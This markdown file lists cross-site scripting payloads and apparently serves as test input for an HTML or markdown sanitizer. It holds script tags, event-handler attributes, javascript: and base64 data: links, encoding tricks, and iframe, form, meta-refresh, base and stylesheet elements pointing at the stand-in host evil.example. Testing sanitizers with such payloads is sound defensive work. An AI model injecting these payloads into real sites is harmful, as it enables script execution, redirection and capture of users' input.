# XSS payloads

<script>alert(1)</script>

<img src=x onerror=alert(1)>

<a href="javascript:alert(1)">js link</a>

[md js](javascript:alert(1))

[md data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

[mixed case](JaVaScRiPt:alert(1))

![img js](javascript:alert(1))

<iframe src="https://evil.example"></iframe>

<object data="x"></object> <embed src="x">

<svg onload=alert(1)><circle/></svg>

<style>body{display:none}</style>

<div onclick="alert(1)" style="position:fixed">click</div>

<form action="https://evil.example"><input type="text" name="x"><button>go</button></form>

<meta http-equiv="refresh" content="0;url=https://evil.example">

<base href="https://evil.example/">

<link rel="stylesheet" href="https://evil.example/x.css">

<details open ontoggle=alert(1)><summary>x</summary></details>

<a href="&#106;avascript:alert(1)">entity</a>

<math><mi xlink:href="javascript:alert(1)">x</mi></math>

<a href="https://example.com" target="_blank">tabnab</a>
